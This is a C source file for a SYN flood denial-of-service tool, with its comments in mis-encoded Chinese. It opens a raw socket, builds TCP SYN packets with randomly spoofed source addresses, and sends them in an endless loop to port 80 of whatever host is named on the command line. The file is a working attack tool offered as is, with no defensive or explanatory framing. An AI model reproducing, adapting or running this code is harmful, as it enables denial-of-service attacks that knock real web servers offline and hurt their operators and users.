#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h> 

#define DESTPORT 80 /* Ҫ�����Ķ˿�(WEB) */ 
#define LOCALPORT 8888

void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);
int main(int argc,char **argv) 
{
	int sockfd;
	struct sockaddr_in addr; 
	struct hostent *host;
	int on=1;
	if(argc!=2) 
	{ 
		fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
		exit(1);
	} 
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family=AF_INET;
	addr.sin_port=htons(DESTPORT);
	if(inet_aton(argv[1],&addr.sin_addr)==0) 
	{ 
		host=gethostbyname(argv[1]);
		if(host==NULL) 
		{  
			fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno)); 
			exit(1); 
		} 
		addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
	} 

	/**** ʹ��IPPROTO_TCP����һ��TCP��ԭʼ�׽��� ****/ 
	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(sockfd<0) 
	{ 
		fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));
		exit(1);
	} 
	// ����IP���ݰ���ʽ,����ϵͳ�ں�ģ��IP���ݰ�
	//�������Լ�����д 
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); 
	// û�а취,ֻ�ó������û��ſ���ʹ��ԭʼ�׽��� 
	setuid(getpid());
	/********* ����ը����!!!! ****/ 
	send_tcp(sockfd,&addr); 
 } 

/******* ����ը����ʵ�� *********/ 
void send_tcp(int sockfd,struct sockaddr_in *addr)
{   
	char buffer[100]; // �����������ǵ����ݰ� 
	struct ip *ip; 
	struct tcphdr *tcp;
	int head_len;

	//���ǵ����ݰ�ʵ����û���κ�����,
	//���Գ��Ⱦ��������ṹ�ĳ���
	head_len=sizeof(struct ip)+sizeof(struct tcphdr);
	bzero(buffer,100); 
	// ���IP���ݰ���ͷ��
	ip=(struct ip *)buffer; 
	ip->ip_v=IPVERSION; // �汾һ����� 4 
	ip->ip_hl=sizeof(struct ip)>>2; //IP���ݰ���ͷ������ 
	ip->ip_tos=0; // �������� 
	ip->ip_len=htons(head_len); // IP���ݰ��ĳ��� 
	ip->ip_id=0; // ��ϵͳȥ��д�� 
	ip->ip_off=0; // ������һ��,ʡ��ʱ�� 
	ip->ip_ttl=MAXTTL; // ���ʱ�� 255 
	ip->ip_p=IPPROTO_TCP; // ����Ҫ������ TCP�� 
	ip->ip_sum=0; // У�����ϵͳȥ�� 
	ip->ip_dst=addr->sin_addr; // ���ǹ����Ķ���

	// ��ʼ��дTCP���ݰ� 
	tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
	tcp->source=htons(LOCALPORT); 
	tcp->dest=addr->sin_port; // Ŀ�Ķ˿� 
	tcp->seq=random(); 
	tcp->ack_seq=0; 
	tcp->doff=5; 
	tcp->syn=1; // ��Ҫ�������� 
	tcp->check=0; 
	while(1)
	{ 
		// �㲻֪�����Ǵ���������,������ȥ�Ȱ�! 
		ip->ip_src.s_addr=random(); 

		//У��ͷ�� 
		tcp->check=check_sum((unsigned short *)tcp, sizeof(struct tcphdr));
		sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
	} 
} 


/* �������ײ�У��͵��㷨 */ 
unsigned short check_sum(unsigned short *addr,int len) 
{      
	register int nleft=len; 
	register int sum=0;
	register short *w=addr; 
	short answer=0; 
	while(nleft>1) 
	{
		sum+=*w++;
		nleft-=2;
	} 
	if(nleft==1)
	{
		*(unsigned char *)(&answer)=*(unsigned char *)w;
		sum+=answer; 
	}
	sum=(sum>>16)+(sum&0xffff); 
	sum+=(sum>>16); 
	answer=~sum; 
	return(answer); 
} 

